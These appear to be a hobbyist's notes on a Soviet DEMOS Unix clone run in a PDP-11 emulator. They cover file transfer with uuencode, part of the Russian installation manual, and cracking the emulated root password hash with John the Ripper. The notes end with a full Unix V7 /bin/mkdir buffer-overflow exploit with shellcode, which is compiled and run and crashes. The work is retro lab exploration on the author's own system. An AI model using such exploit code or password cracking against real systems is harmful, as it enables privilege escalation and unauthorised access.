@@ -1,0 +1,981 @@
+#Howto copy files from host to dvk-pdp11 DEMOS
+
+- On host simply do 
+ $ tar cf floppy.img somefile.c 
+- Attach floppy.img in demos.ini  
+ attach kmd0 floppy.img
+- Once DEMOS is booted do 
+ SUPER>  tar xf /dev/fd0 
+
+
+#Howto copy files from dvk-pdp11 to host? 
+for some reason the gnu tar does not like tarballs made on DEMOS 
+I could not get the followin to work 
+
+- On dvk-pdp11 
+SUPER > tar cf /dev/fd0 /usr/bin/somefile 
+(this works) 
+On the host
+$ tar xvf floppy.img
+tar: Removing leading `/' from member names
+/usr/bin/crypt
+tar: A lone zero block at 42
+
+So I decided to upload an ancient uuencode.c to the host via the floppy.img method
+In our example we will upload uuencode.c and compile it 
+
+
+<----uuencode------->
+
+/*
+ * Copyright (c) 1983 Regents of the University of California.
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms are permitted
+ * provided that the above copyright notice and this paragraph are
+ * duplicated in all such forms and that any documentation,
+ * advertising materials, and other materials related to such
+ * distribution and use acknowledge that the software was developed
+ * by the University of California, Berkeley.  The name of the
+ * University may not be used to endorse or promote products derived
+ * from this software without specific prior written permission.
+ * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
+ * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
+ * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
+ */
+
+/*
+ * Modified 12 April 1990 by Mark Adler for use on MSDOS systems with
+ * Microsoft C and Turbo C.  Standard input problem fixed 29 April 1990
+ * as per suggestion by Steve Harrold.
+ *
+ * Modifed 13 February 1991 by Greg Roelofs for use on VMS systems.
+ * Compile and link normally (but note that the shared-image link option
+ * produces a binary only 6 blocks long, as opposed to the 152-block one
+ * produced by an ordinary link).  To set up the VMS symbol to run the
+ * program ("run uuencode filename1 filename2 filename3" won't work), do:
+ *		uuencode :== "$disk:[directory]uuencode.exe"
+ * and don't forget the leading "$" or it still won't work.  The syntax
+ * differs slightly from the Unix and MS-DOS versions since VMS has such
+ * an awkward approach to redirection; run the program with no arguments
+ * for the usage (or see USAGE below).  The output file is in VMS "stream-
+ * LF" format but should be readable by MAIL, ftp, or anything else.
+ */
+
+#ifndef lint
+static char sccsid[] = "@(#)uuencode.c	5.6 (Berkeley) 7/6/88";
+#endif /* not lint */
+
+#ifdef __MSDOS__        /* For Turbo C */
+#define MSDOS 1
+#endif
+
+/*
+ * uuencode [input] output
+ *
+ * Encode a file so it can be mailed to a remote system.
+ */
+#include <stdio.h>
+
+#ifdef VMS
+#  define OUT out	/* force user to specify output file */
+#  define NUM_ARGS 3
+#  define USAGE "Usage: uuencode [infile] remotefile uufile\n"
+#  include <types.h>
+#  include <stat.h>
+#else
+#  define OUT stdout	/* Unix, MS-DOS:  anybody with decent redirection */
+#  define NUM_ARGS 2
+#  define USAGE "Usage: uuencode [infile] remotefile\n"
+#  include <sys/types.h>
+#  include <sys/stat.h>
+#endif
+
+#if MSDOS
+#include <io.h>
+#include <fcntl.h>
+#endif
+
+/* ENC is the basic 1-character encoding function to make a char printing */
+#define ENC(c) ((c) ? ((c) & 077) + ' ': '`')
+
+main(argc, argv)
+char **argv;
+{
+#ifdef VMS
+	FILE *out;
+#endif
+	FILE *in;
+	struct stat sbuf;
+	int mode;
+
+	/* optional 1st argument */
+	if (argc > NUM_ARGS) {
+		if ((in = fopen(argv[1], "r")) == NULL) {
+			perror(argv[1]);
+			exit(1);
+		}
+		argv++; argc--;
+	} else
+		in = stdin;
+
+#if MSDOS
+	/* set input file mode to binary for MSDOS systems */
+	setmode(fileno(in), O_BINARY);
+#endif
+
+	if (argc != NUM_ARGS) {
+		fprintf(stderr, USAGE);
+		exit(2);
+	}
+
+#ifdef VMS   /* mandatory 3rd argument is name of uuencoded file */
+	if ((out = fopen(argv[2], "w")) == NULL) {
+		perror(argv[2]);
+		exit(4);
+	}
+#endif
+
+	/* figure out the input file mode */
+	if (fstat(fileno(in), &sbuf) < 0 || !isatty(fileno(in)))
+		mode = 0666 & ~umask(0666);
+	else
+		mode = sbuf.st_mode & 0777;
+	fprintf(OUT, "begin %o %s\n", mode, argv[1]);
+
+	encode(in, OUT);
+
+	fprintf(OUT, "end\n");
+	exit(0);
+}
+
+/*
+ * copy from in to out, encoding as you go along.
+ */
+encode(in, out)
+register FILE *in;
+register FILE *out;
+{
+	char buf[80];
+	register int i, n;
+
+	for (;;) {
+		/* 1 (up to) 45 character line */
+		n = fread(buf, 1, 45, in);
+		putc(ENC(n), out);
+
+		for (i=0; i<n; i += 3)
+			outdec(&buf[i], out);
+
+		putc('\n', out);
+		if (n <= 0)
+			break;
+	}
+}
+
+/*
+ * output one group of 3 bytes, pointed at by p, on file f.
+ */
+outdec(p, f)
+register char *p;
+register FILE *f;
+{
+	register int c1, c2, c3, c4;
+
+	c1 = *p >> 2;
+	c2 = (*p << 4) & 060 | (p[1] >> 4) & 017;
+	c3 = (p[1] << 2) & 074 | (p[2] >> 6) & 03;
+	c4 = p[2] & 077;
+	putc(ENC(c1), f);
+	putc(ENC(c2), f);
+	putc(ENC(c3), f);
+	putc(ENC(c4), f);
+}
+
+<-----------UUENCODE-END--------------> 
+
+
+so do tar cf floppy.img uuencode.c  
+
+On the dvk-pdp11 DEMOS 
+SUPER > goto some directory where you want to extract uuencode.c from floppy
+SUPER > tar xf /dev/fd0 
+SUPER > cc uuencode.c -o uuencode 
+
+Now we are ready to uuencode binary files :) 
+
+SUPER > ./uuencode /path/to/binary binaryname 
+
+Copy  the text output in the Telnet console 
+Paste the text output to host and save as file.txt
+
+On debian you need the sharutils 
+apt-get install sharutils 
+
+uudecode file.txt 
+
+You should have the binary file in the path 
+
+file crypt
+crypt: PDP-11 executable 
+
+
+
+
+
+
+Some other points of interest 
+
+SUPER 74> cat /etc/passwd
+root:vQwdXj/6D.J2M:0:2:Суперпользователь (The God):/:/bin/csh
+daemon:***:1:1:Дьявол во плоти:/:
+sys:***:2:2::/:
+bin:***:3:2::/:
+uucp::4:1:Сеть UUCP:/usr/spool/uucppublic:/usr/lib/uucp/uucico
+notes:***:5:1:Создатель Notesfiles:/usr/spool/notes:
+anon:***:6:1:Анонимный пользователь Notesfiles:/usr/spool/notes:
+news:***:7:1:Создатель новостей:/usr/spool/news:
+bugs:***:8:1:Адресат для сообщений об ошибках:/usr/spool/mail:/usr/bin/mail
+rubin:***:100:2:суперпользователь СУБД РУБИН:/usr/rubin:/bin/csh
+user::101:1:Пользователь:/usr/user:/usr/bin/vs
+
+- Save the above as dkv-pdp11-passwd
+- Install John the Ripper 
+# apt-get install john 
+- Create a wordlist file with the password we have set in dvk-pdp11 DEMOS
+  and add multiple variations to the password to verify the cipher on DEMOS 
+$ john --wordlist=wordlist dvk-pdp11-passwd 
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+p4ssw0rd         (root)
+1g 0:00:00:00 100% 5.263g/s 78.94p/s 78.94c/s 78.94C/s passw0rd..p4ssw0rd
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+It works, we have cracked a Soviet DEMOS root password :) 
+
+
+Now lets dump the kernel 
+
+SUPER > ./uuencode /demos demos 
+ - copy the ASCII 
+ - paste the ASCII to host demos.txt 
+$ uudecode demos.txt 
+
+On DEMOS 
+
+SUPER 27> ls -la /demos
+-rwxrwxr-x 1 root     superuse   81188 сен 10 17:59 /demos
+SUPER 28> file /demos
+/demos: overlaid pure executable not stripped
+
+On Debian : 
+
+user@X201:~/UNIX/dvk-demos > file demos
+demos: PDP-11 overlaid pure executable not stripped
+
+
+So now we have a binary kernel for further analysis 
+
+
+
+
+
+            1. НАСТРОЙКА ОПЕРАЦИОННОЙ СИСТЕМЫ ДЕМОС
+                ====================================
+
+        В разделе описываются процедуры, которые необходимо вы-
+   полнять, как при первичной установке системы, так и в случае
+   "полного разрушения" корневой файловой  системы  или  замены
+   жесткого  диска; описывается корневая файловая система и не-
+   которые справочники.
+
+        Процесс подготовки системы к эксплуатации можно  разде-
+   лить на следующие этапы:
+        - первичная установка (или  восстановление)  системы  с
+   дистрибутивного набора гибких магнитных дисков (ГМД);
+        - загрузка системы и проверка ее целостности;
+        - настройка системных файлов.
+        При "частичном разрушении" файловых  систем  рекоменду-
+   ется  попытаться восстановить их целостность программой fsck
+   (см. приложение 2).
+
+        1.1. Первичная установка системы
+             ===========================
+        Для первичной установки системы необходимо:
+        - тумблером "СЕТЬ" включить ПЭВМ;
+        - вставить дискету с номером 0  (стартовую  дискету)  в
+   верхнее устройство (нулевое);
+        - получив приглашение "@", нажать клавишу <B>, и  затем
+   в ответ на приглашение "$" (доллар) ввести "MY0" (или "MY" и
+   нажать клавишу <ВК>);
+        - через некоторое время на экран будет выдано приглаше-
+   ние  "BOOT:...";  в  ответ на него необходимо нажать клавишу
+   <ВК>;
+        - на запрос "установка ДЕМОС требует стирания  информа-
+   ции на жестком диске..." необходимо ответить "Y" (YES) и на-
+   жать клавишу <ВК>; отменить неправильно введенный символ (до
+   нажатия клавиши <ВК>) можно при помощи клавиши <ЗБ>;
+        - на запрос "Введите  время..."  необходимо  ввести  10
+   цифр  и  нажать клавишу <ВК>; время задается следующим обра-
+   зом:
+        ггммддччмм,
+   где  гг - две последние цифры номера года (например, 90);
+        мм - номер месяца (от 01 до 12);
+        дд - номер дня в месяце;
+        чч - час (от 00 до 23);
+        мм - минуты (от 00 до 59);
+        - на запрос "Емкость накопителя  на  жестком  диске..."
+   необходимо  ввести  цифру  -  номер типа накопителя и нажать
+   клавишу <ВК>; тип накопителя задается следующим образом:
+
+  1.  5 Мб  153 цилиндра  /0-152/ - установка СУБД "РУБИН" невозможна
+  2. 10 Мб  306 цилиндров /0-305/ - установка СУБД "РУБИН" невозможна
+  3. 10 Мб  306 цилиндров /0-305/ - установка СУБД "РУБИН" возможна
+  4. 20 Мб  612 цилиндров /0-611/ - установка СУБД "РУБИН" возможна
+
+        - далее на запрос "Форматировать жесткий диск?" необ-
+   ходимо ввести "Y", если требуется отформатировать диск, либо
+   ввести "N", если не требуется;
+        - после загрузки минисистемы на жесткий диск будет  вы-
+   дано  сообщение о необходимости ее перевызова с этого диска;
+   через некоторое время будет выдано приглашение "@";
+        - в ответ на это приглашение необходимо набрать "B",  а
+   затем  в ответ на приглашение "$" (доллар) ввести "DW0" (или
+   "DW" и нажать клавишу <ВК>);
+  - через некоторое время на экран будет выдано приглаше-
+        ние  "BOOT:...";  в  ответ на него необходимо нажать клавишу
+        <ВК>;
+  - после того, как система будет вызвана, она запросит дискету N1 из
+        базового набора; ее необходимо вставить в любой накопитель
+        на гибких  дисках, ввести номер накопителя и нажать
+        клавишу <ВК>;
+  - после считывания дискеты система запросит  следующую;
+        необходимо вынуть дискету с номером 1 из накопителя
+        и вставить дискету с номером 2, затем с номером 3 и
+        так далее;
+  - после того, как будут прочитаны все дискеты  базового
+        набора, система автоматически перезагрузится и проверит фай-
+        ловую систему на жестком диске  (при  этом  может  произойти
+        повторная перезагрузка);
+  - после перезагрузки система выдаст приглашение "Имя:";
+        необходимо  ввести имя суперпользователя root для выполнения
+        административных функций в системе ДЕМОС.
+
+  Если вход в систему выполнен первый раз после  первона-
+        чальной  установки системы или полного восстановления, необ-
+        ходимо проделать следующее:
+  - установить  пароль  для  пользователя  root  командой
+        passwd;
+  - продублировать дистрибутивный набор ГМД.
+
+  Для копирования дискет можно использовать команду  cpfd
+        (см. 4.6.2).
+  Перед выключением ПЭВМ  пользователь  должен  выполнить
+        команду:
+  /etc/reboot -h ( Обязательно !!! )
+
+  На дискетах дистрибутивного набора должны быть наклеены
+        маркеры  защиты записи. Это необходимо для того, чтобы из-за
+        неисправности аппаратуры или неосторожного использования  не
+        разрушить информацию на дискетах.
+        Во время загрузки с дискеты с номером 0, она
+        должна быть без маркера.
+
+  1.2. Загрузка и проверка целостности системы
+       =======================================
+  Для загрузки операционной системы ДЕМОС необходимо:
+  - включить питание ПЭВМ;
+  - получив приглашение "@", нажать клавишу <B>, и  затем
+        в ответ на приглашение "$" (доллар) ввести "DW0" (или "DW" и
+        нажать клавишу <ВК>);
+  - через некоторое время на экран будет выдано приглаше-
+        ние  "BOOT:...";  в  ответ на него необходимо нажать клавишу
+        <ВК>;
+  - на запрос "Введите время ..."  необходимо  ввести  10
+        цифр и нажать клавишу <ВК>;
+  - далее на запрос "Проверять файловые системы?" необхо-
+        димо  нажать клавишу <ВК> (если требуется проверять файловые
+        системы) или ввести "N" и нажать клавишу <ВК> (если не  тре-
+        буется проверять файловые системы);
+  - после проверки файловых систем будет выдано приглаше-
+        ние  "Имя:"; необходимо ввести имя, под которым пользователь
+        зарегистрирован в системе; после его обработки  осуществится
+        вход в систему.
+
+        П р и м е ч а н и е. Во время проверки файловых  систем
+   может произойти повторная перезагрузка.
+
+        Если в ответ на запрос "Имя:" ввести "user",  то  прои-
+   зойдет  вход  в  систему ПРАКТИКА (описание системы ПРАКТИКА
+   см. разд.3 "Справочного руководства").
+
+        После завершения работы в системе необходимо на пригла-
+   шение для ввода команд набрать "/etc/reboot -h"; после того,
+   как система ответит "SYNCING DISKS ... DONE",  можно  выклю-
+   чить питание ПЭВМ.
+
+
+       2. РАСШИРЕННЫЕ ВОЗМОЖНОСТИ ОС ДЕМОС ВЕРСИИ 3.0
+          ===========================================
+  1.
+      Генерация ядра demos содержит следущие изменения в
+  сторону повышенной оптимальности и эффективности работы ядра:
+
+      a). Создан новый, максимально быстрый и очень расторопный
+          в работе драйвер жесткого диска типа "Винчестер", ре-
+          жимы  работы которого настраиваются программой rwset.
+
+      b). Откорректирован и оптимизирован драйвер гибкого
+          диска.
+
+      c). Создан новый суперуниверсальный драйвер принтера,
+          поддерживающий работу печатающих устройств типа:
+          EPSON FX-800, EPSON LX-800, СМ 6302, DZM-180, СМ 6315,
+          СМ 6900, ROBOTRON СМ 6329, D100, D100M, и т.д.
+          в полном объеме их функциональных возможностей
+          и с учетом ошибок в ПЗУ EPSON FX-800. Режимы работы
+          драйвера настраивается программой lpset.
+          Подробнее см. файл READ_LP в корневом каталоге.
+
+      d). Данная версия ядра поддерживает работу контроллера КЦГД
+          как с ПЗУ КР18101РЕ2-181 на плате КЦГД, так и с ПЗУ
+          КР18101РЕ2-182, работающей в 8-битном символьном режиме.
+          (Следует заметить, что ядро версии 2.0 не способно рабо-
+          тать с КЦГД на ПЗУ КР18101РЕ2-182). Однако, поставляемый
+          графический протокол /etc/graf,загружаемый в ОЗУ КЦГД
+          и разработанный для ПЗУ КР18101РЕ2-181, не будет за-
+          гружаться при ПЗУ КР18101РЕ2-182. В настоящее время
+          разрабатывается новый графический протокол для
+          последней ПЗУ.
+
+          В целях экономии памяти изменены параметры
+          конфигурации ядра:
+
+      e). Количество буферов ввода/вывода.
+
+      f). Количество процессов в системе.
+
+      g). Количество одновременно исполняемых программ.
+
+      h). Количество описателей файлов.
+
+      i). Количество одновременно открытых файлов.
+
+      j). "Зажата" статистика по буферам ввода/вывода, по под-
+          качке, по загрузке системы, по командам.
+
+      k). Уменьшено количество оверлеев ядра demos.
+
+      l). И другие мелочи...
+
+  2.
+      Устранены ошибки в загрузчике boot, что позволило
+  работать на разных типах жестких дисков.
+
+  3.
+      Устранены ошибки в промежуточных загрузчиках
+  rwuboot, fduboot.
+
+  4.
+      Новая версия 4.1 полиэкранного редактора red
+  содержит следующие изменения и дополнения:
+
+      a). <ПФ1><i><ВК> установка/сброс режима вставки.
+
+      b). <ПФ1><b><ВК> установка режима 132 символа на экране.
+
+      c). <ПФ1><l><ВК> установка режима 80 символов на экране.
+
+      d). <ПФ1><g><ВК> установка режима прорисовки символов
+          псевдографики. С помощью клавиш <Ф4>,<Ф5>,<Ф6>,<Ф8>
+          можно "рисовать" и "стирать" вертикальные и горизон-
+          тальные сплошные линии.
+
+      e). <ПФ1><Ф0> установка/сброс режима рисования/стирания псевдографики.
+
+      f). <ПФ1><n><ВК> выход из режима псевдографики.
+
+      g). <Ф1>   перемещение курсора по словам вперед.
+
+      h). <ПФ4> перемещение курсора по концам строк.
+
+      i). <Ф5>   удаление слова справа от курсора.
+
+      j). <ПФ1><Ф2><стрелка вправо> перемещение курсора
+          в правую крайнюю позицию текущего окна.
+
+      k). <ПФ1><Ф2><стрелка влево> перемещение курсора
+          в левую крайнюю позицию текущего окна.
+
+      l). <ПФ1><Ф2><стрелка вверх> перемещение курсора
+          в верхнюю крайнюю позицию текущего окна.
+
+      m). <ПФ1><Ф2><стрелка вниз> перемещение курсора
+          в нижнюю крайнюю позицию текущего окна.
+
+      n). <ПФ1><восьмеричное число><Ф2><Ф0> ввод спец. символов,
+           где число состоит из трех цифр.
+
+      о). Оптимизирован вывод информации на экран при
+          использовании клавиш <Ф7>, <ПФ1><Ф7>, <Ф2><Ф7>, <ПФ1><Ф2><Ф7>
+
+      p). Отменено действие клавиши <Ф.>, как табуляции назад
+
+  5.
+      Откорректирована программа graf (файл etc/graf).
+      Графический протокол теперь можно загружать как
+      в режиме совместимости ( VT52 ), так и в расширен-
+      ном режиме ( VT100 ) дисплея.В файл etc/termcap вклю-
+      чена esc-последовательность установки зоны рулона со 2
+      по 22 строки экрана, что улучшает наглядность ра-
+      боты редактора red и другие незначительные изменения.
+
+  6.
+      Сделана удобная начальная установка ОС ДЕМОС на жесткий диск
+      (см. выше п.1) с учетом разных их типов и СУБД "РУБИН".
+
+  7.
+      Внесены небольшие изменения в стартовый файл etc/rc
+      ( связанные с программами fsck, mount ).
+
+  8.
+      Графическая библиотека libgraph.a находится в
+  каталоге usr/lib и является функциональным аналогом графи-
+  ческой библиотеки фирмы "Borland International". В файле
+  READ_GRAF содержится описание графических функций.
+
+
+                    *  *  *  *  *
+
+  9.
+      Программа opint определяет оптимальный интерливинг по сек-
+  торам,поверхностям,цилиндрам и форматирует винчестер.Контроль-
+  ное тестирование после форматирования винчестера с оптимальным
+  интерливингом показало,что эффективность работы с винчестером
+  возросла в среднем на 25-30%.Программа opint должна запускаться
+  с дискетты ( ОС загружается при этом также с дискетты под номе-
+  ром 0 ).Программа opint имеет следущие ключи:
+
+  Usage: opint {-i[N] | -f [-q] [-bN] [-lN] [-sN] [-cN]} [-r]
+
+ -i[N]  вычислить оптимальный фактор интерливинга по
+        секторам/поверхностям/ и по цилиндрам. N-номер
+        рабочего цилиндра, используется также цилиндр N-1
+        ( по умолчанию N==152 )
+
+    -f  форматировать винчестер
+
+    -r  не сохранять информацию на винчестере (на нефор-
+        матированном винчестере этот ключ обязателен !!!)
+
+    -q  без вопросов
+
+   -bN  установить начало форматирования с N-го цилиндра
+        включительно (по умолчанию с цилиндра N==0),
+        этот цилиндр (а также предыдущий) используется в
+        качестве рабочего для поиска оптимального интерли-
+        винга, если используется ключ -b0 или таковой отсут-
+        ствует вообще, то рабочим становится 152 цилиндр.
+
+   -lN  установить конец форматирования до N-го цилиндра
+        включительно (по умолчанию до цилиндра N==152)
+
+   -sN  установить фактор интерливинга N по секторам/по-
+        верхностям/ (по умолчанию N==оптимальный)
+
+   -cN  установить фактор интерливинга N по цилиндрам
+        (по умолчанию N==оптимальный)
+
+  10.
+      Программа rwset служит для настройки режимов работы
+  драйвера жесткого диска и имеет ключи:
+
+        Usage: rwset [-cN] [[-]w]
+        -cN - включить предкомпенсацию с N-го цилиндра
+         w - включить проверку записи
+        -w - выключить проверку записи
+
+  11.
+      Программа lpset служит для настройки режимов работы
+  драйвера печатающего устройства. Вся инфорамация по печати
+  содержится в файле READ_LP.
+
+                    * * * * * * *
+
+       3. ОПЕРАЦИОННАЯ СИСТЕМА ДЕМОС/306
+          ==============================
+
+  Операционная система ДЕМОС/306 предназначена для установки и
+  функционирования на одном жестком диске ("Винчестер", 20Мб) с
+  операционной системой RT-11. Жесткий диск емкостью 20Мб
+  между двумя ОС распределяется следующим образом :
+
+         RT-11 : с   0 по 305 цилиндр (10Мб)
+         ДЕМОС : с 306 по 611 цилиндр (10Мб)
+
+  Первоначально (по включению питания) происходит загрузка ОС RT-11,
+  причем драйвер жесткого диска должен быть настроен на работу с
+  10 Мб дискового пространства (по 305 цилиндр включительно).
+  После загрузки RT-11 ОС ДЕМОС/306 вызывается командой DEMOS.
+
+  Начальная  установка ОС ДЕМОС/306 от установки ОС ДЕМОС отличается
+  всего лишь одной установочной дискетой N0; остальные пять дискет
+  дистрибутива N1-N5 идентичны для обеих ОС.
+
+          Пользователь, уставший от двухколесного самоката RT-11
+          нажатием пяти клавиш пересаживается в стратегический
+          бомбардировщик DEMOS/306 !
+
+          ОС ДЕМОС/306 - ЭТО ПРОРЫВ В БУДУЩЕЕ !
+          ОС ДЕМОС/306 - ЭТО ПРОСТО ФАНТАСТИКА !
+
+  POSTCRYPTUM 1.
+  -------------- В каталоге /TEST содержатся контольно-демонстра-
+                 ционные задачи и тесты, которые запускаются ко-
+                 мандой /TEST/main.
+
+  POSTCRYPTUM 2.
+  -------------- В поставляемом дистрибутиве в каталогах bin/,
+                 usr/bin/, etc/ содержатся утилиты и файлы
+                 (в частности:
+
+                 c7t10    nroff      autoconfig  termcap
+                 chgrp    pp         clri        timstat
+                 chown    pstat      cron        ttys
+                 dump     restor     dostat      utpm
+                 dumpdir  rline      getty       wall
+                 edit     rmail      graf
+                 egrep    setcolor   group
+                 false    smbl       group.std
+                 fgrep    startcode  init
+                 gets     starttext  iostat
+                 login    su         lp_daemon
+                 lpf      tfd0       mknod
+                 lpset    wermit     psdatabase
+                 lx       accton     savecore
+                 mix      admclean   shutdown
+
+                 и другие...), на которые нет описаний в докумен-
+                 тации, т.к. описания на утилиты и файлы, необхо-
+                 димые администратору системы или системному програм-
+                 мисту и не связанные непосредственно с работой поль-
+                 зователя выходят за рамки данной документации, имею-
+                 щей цель дать самые необходимые сведения для пользо-
+                 вателя. Описания можно найти в различной литературе
+                 по ОС UNIX т.к. большинство утилит и служебных
+                 файлов имеют общепринятые в семействе ОС UNIX имена.
+                 С другой стороны, не все утилиты ( в частности:
+
+                 ardos     from      mkmf      splineg
+                 banner    hier      mm        strings
+                 blank     hostname  prmail    sum
+                 checkobj  ident     rab       unifdef
+                 ckdir     indent    rcs       units
+                 colcrt    install   rcsdiff   uptime
+                 ctags     last      rcsintro  uucpc
+                 cxref     lastcomm  rcsmerge  uuxc
+                 ddutok    lex       rev       whoami
+                 error     lint      rlog      badsect
+                 expand    look      script    ncheck
+                 fold      merge     spell
+
+                 и другие... ), описанные в документации, содержатся
+                 в дистрибутиве, т.к. документация составлялась с
+                 учетом дальнейших разработок.
+
+  POSTCRYPTUM 3.
+  -------------- В дистрибутив не входят и поставляются
+                            отдельнo:
+
+                 a). СУБД "РУБИН"./ с комплектом документации /
+
+                 b). Интегрированная оболочка "Demos Commander" -
+                     аналог "Norton Commander".
+
+  POSTCRYPTUM 4.
+  -------------- Над версией 3.0 ОС ДЕМОС работали:
+
+                           Юдин К.Е.
+                           Судаков А.В.
+                           Рыжонков К.С.
+                           Брагин Д.Н.
+
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  Copyright 1991 by Research Institute "Scientific Centre",
+              lab 462/2. All rights reserved.
+
+                      PHONE:   536-56-42.
+
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  МОСКВА, ЗЕЛЕНОГРАД, НИИ "НАУЧНЫЙ ЦЕНТР"(лаб.462/2),
+
+                      ТЕЛЕФОН: 536-56-42.
+
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Attempted to execute an exploit 
+
+UNIX 7th Edition /bin/mkdir - Local Buffer Overflow
+http://www.exploit-db.com/exploits/302/
+
+
+--------------------snip-----------------------------------------
+
+/*
+ * Exploit for /bin/mkdir Unix V7 PDP-11.
+ * mkdir has a buffer overflow when checking if the directory
+ * in /arg/with/slashes/fname exists.
+ *
+ * This will run /bin/sh with euid 0, but not uid 0.  Since
+ * the shell doesn't do anything special about this, we don't
+ * really care.  If you care, run  setuid(0); execl("/bin/sh", 0);
+ */
+ 
+/*
+.globl  _main
+_main:
+    mov  pc,r1
+    sub  $-[sh-_main-2], r1             / pointer to sh
+    mov  r1, r2
+    sub  $-8, r2
+    clrb -1(r2)                         / null terminate
+    mov  r1, r2
+    clr  -(r1)                          / char *env[] = {0}
+    mov  r1, r3
+    mov  r2, -(r1)                      / char *argv[] = {sh, 0}
+    mov  r1, r4
+    mov  r3, -(r1)                      / reverse of sh,argv,env
+    mov  r4, -(r1)
+    mov  r2, -(r1)
+    sys  59.; 11111; 11111; 11111       / call execve
+argv:   11111; 11111
+sh:     </bin/sh>
+*/
+ 
+char egg[] = { 0301, 021, 0301, 0345, 0326, 0377, 0102, 020,
+    0302, 0345, 0370, 0377, 062, 0212, 0377, 0377,
+    0102, 020, 041, 012, 0103, 020, 0241, 020,
+    0104, 020, 0341, 020, 041, 021, 0241, 020,
+    073, 0211, 0111, 022, 0111, 022, 0111, 022,
+    0111, 022, 0111, 022, 057, 0142, 0151, 0156,
+    057, 0163, 0150, 0 };
+ 
+#define NOPSLIDE 50
+#define CNT 136
+#define PC 0xfea0
+ 
+main(argc, argv)
+    int argc;
+    char **argv;
+{
+    char buf[400];
+    int i;
+    char *argv2[4];
+ 
+    /* nop slide + egg */
+    for(i = 0; i < NOPSLIDE; ) {
+        buf[i++] = 0301;
+        buf[i++] = 021;
+    }
+    strcpy(buf + i, egg);
+ 
+    /* pad out to CNT */
+    for(i = strlen(buf); i < CNT; i++)
+        buf[i] = 'a';
+ 
+    /* overwrite retaddr */
+    buf[i++] = PC & 0xff;
+    buf[i++] = PC >> 8;
+ 
+    /* extra stuff */
+    buf[i++] = '/';
+    buf[i++] = 'a';
+    buf[i++] = 0;
+ 
+    argv2[0] = "/bin/mkdir";
+    argv2[1] = buf;
+    argv2[2] = 0;
+    execv(argv2[0], argv2);
+    return 0;
+}
+
+----------------------SNIP-------------------
+
+
+Before we run this exercise we need to modifiy /etc/passwd 
+so that the default shell for the user is changed to /bin/csh 
+
+DEMOS on dvdk-pdp11 has the ancient ed editor which is quite
+cryptic to learn today ... 
+
+So how do we edit /etc/passwd ? 
+
+There are a few options, 
+
+first is to simply use cat
+
+so forst on dvd-pdp11 DEMOS do :
+SUPER > cat /etc/passwd 
+- Copy the output 
+- On host paste the output to a file passwd.txt 
+- Edit with your favourite editor and change the user shell 
+$ cat passwd.txt 
+- Copy the output 
+SUPER > mv /etc/passwd /etc/passwd.old
+SUPER > cat <<EOF> /etc/passwd 
+roott:vQwdXj/6D.J2M:0:2:Superuser (The God):/:/bin/csh
+daemon:***:1:1:Deamon:/:
+sys:***:2:2::/:
+bin:***:3:2::/:
+uucp::4:1:Network UUCP:/usr/spool/uucppublic:/usr/lib/uucp/uucico
+notes:***:5:1:Notes Notesfiles:/usr/spool/notes:
+anon:***:6:1:anonymouns Notesfiles:/usr/spool/notes:
+news:***:7:1:News:/usr/spool/news:
+bugs:***:8:1:Bugs:/usr/spool/mail:/usr/bin/mail
+rubin:***:100:2:RUBIN DB User:/usr/rubin:/bin/csh
+user:CRdA8QWcCutMQ:101:1:User:/usr/user:/bin/csh
+EOF 
+
+- Here we have the following (crypt) hashed password : 
+p4ssw0rd for root and password for user
+
+
+Also lets modify the /etc/group so it reflects our user ! 
+SUPER > cat /etc/group 
+- Copy the output
+- On host paste the output to a file group.txt
+- Edit with your favourite editor and add user to users group 
+$ cat group.txt 
+SUPER > mv /etc/group /etc/group.old
+SUPER > cat <<EOF> /etc/group 
+superuser:***:0:root
+daemon::1:daemon,avg,dmitry
+sys::2:bin,sys,yst,root
+bin::3:bin,sys,avg,alex
+uucp:***:4:uucp
+users:***:10:sviridov,flerov,guba,polina,lena,tasha,guest,test,user
+EOF  
+
+I wonder who Polina, Lena and Tasha were ... 
+If they are still around I send my regards ! 
+
+
+- Now exit from SUPER > shell
+CTRL+D 
+- Login as user 
+user > pwd
+/usr/user
+user > cat <<EOF> /usr/user/exploit.c
+char egg[] = { 0301, 021, 0301, 0345, 0326, 0377, 0102, 020,
+    0302, 0345, 0370, 0377, 062, 0212, 0377, 0377,
+    0102, 020, 041, 012, 0103, 020, 0241, 020,
+    0104, 020, 0341, 020, 041, 021, 0241, 020,
+    073, 0211, 0111, 022, 0111, 022, 0111, 022,
+    0111, 022, 0111, 022, 057, 0142, 0151, 0156,
+    057, 0163, 0150, 0 };
+ 
+#define NOPSLIDE 50
+#define CNT 136
+#define PC 0xfea0
+ 
+main(argc, argv)
+    int argc;
+    char **argv;
+{
+    char buf[400];
+    int i;
+    char *argv2[4];
+ 
+    /* nop slide + egg */
+    for(i = 0; i < NOPSLIDE; ) {
+        buf[i++] = 0301;
+        buf[i++] = 021;
+    }
+    strcpy(buf + i, egg);
+ 
+    /* pad out to CNT */
+    for(i = strlen(buf); i < CNT; i++)
+        buf[i] = 'a';
+ 
+    /* overwrite retaddr */
+    buf[i++] = PC & 0xff;
+    buf[i++] = PC >> 8;
+ 
+    /* extra stuff */
+    buf[i++] = '/';
+    buf[i++] = 'a';
+    buf[i++] = 0;
+ 
+    argv2[0] = "/bin/mkdir";
+    argv2[1] = buf;
+    argv2[2] = 0;
+    execv(argv2[0], argv2);
+    return 0;
+}
+EOF 
+user > cc exploit.c -o /usr/user/exploit 
+user > ./exploit 
+mkdir: cannot access аааааааааааааааааааааааааааЕжЪBбЕЬЪ2
+ЪЪB!
+C!DА!!; IIIII/bin/shaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Ч/.
+Наруш. защиты памяти
+user > 
